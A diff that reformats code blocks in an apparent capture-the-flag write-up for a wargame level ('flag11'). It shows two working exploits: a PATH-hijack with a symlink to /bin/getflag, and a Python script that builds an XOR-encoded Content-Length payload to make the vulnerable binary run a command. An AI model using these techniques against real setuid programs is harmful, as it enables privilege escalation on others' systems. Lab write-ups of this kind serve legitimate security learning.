@@ -26,23 +26,26 @@ Solution
 * First way:
 
 .. code-block:: bash
-		export PATH=/tmp/:$PATH
-		ln -s /bin/getflag d
-		echo -ne "Content-Length: 1\nd" | /home/flag11/flag11
+
+   export PATH=/tmp/:$PATH
+   ln -s /bin/getflag d
+   echo -ne "Content-Length: 1\nd" | /home/flag11/flag11
+
 .. note::
    Execute it until an "e" comes up, if this letter shows then you can execute
 
 * Second way:
 
 .. code-block:: python
-		string = "/bin/getflag\x00"
-		key = 0
 
-		enc_string = ""
+   string = "/bin/getflag\x00"
+   key = 0
 
-		for char in string:
-		    enc_char = ord(char) ^ key & 0xff
-		    enc_string += chr(enc_char)
-		    key = key - ord(char) & 0xff
+   enc_string = ""
 
-		print "Content-Length: 1024\n" + enc_string + "\x00" * (1024 - len(enc_string))
+   for char in string:
+       enc_char = ord(char) ^ key & 0xff
+       enc_string += chr(enc_char)
+       key = key - ord(char) & 0xff
+
+   print "Content-Length: 1024\n" + enc_string + "\x00" * (1024 - len(enc_string))
